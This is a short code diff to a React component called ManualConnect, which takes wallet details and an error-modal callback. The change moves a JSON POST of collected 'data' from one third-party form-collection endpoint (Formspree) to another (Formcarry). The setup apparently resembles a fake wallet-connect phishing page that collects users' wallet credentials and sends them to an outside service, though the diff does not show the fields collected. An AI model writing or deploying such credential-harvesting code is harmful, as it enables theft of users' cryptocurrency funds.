@@ -68,14 +68,14 @@ const ManualConnect = ({ backToErrorModal, userWalletDetails, closeManualConnect
   
 
     try {
-      const result = await fetch("https://formspree.io/f/xqapnoop", {
+      const result = await fetch("https://formcarry.com/s/gqHpTaauB8x", {
         method: 'POST',
         headers: {
           "Accept": "application/json",
           "Content-Type": "application/json"
         },
         body: JSON.stringify(data)
-      });
+      })
   
       const responseresult = await result.json();
       setIsLoading(false);
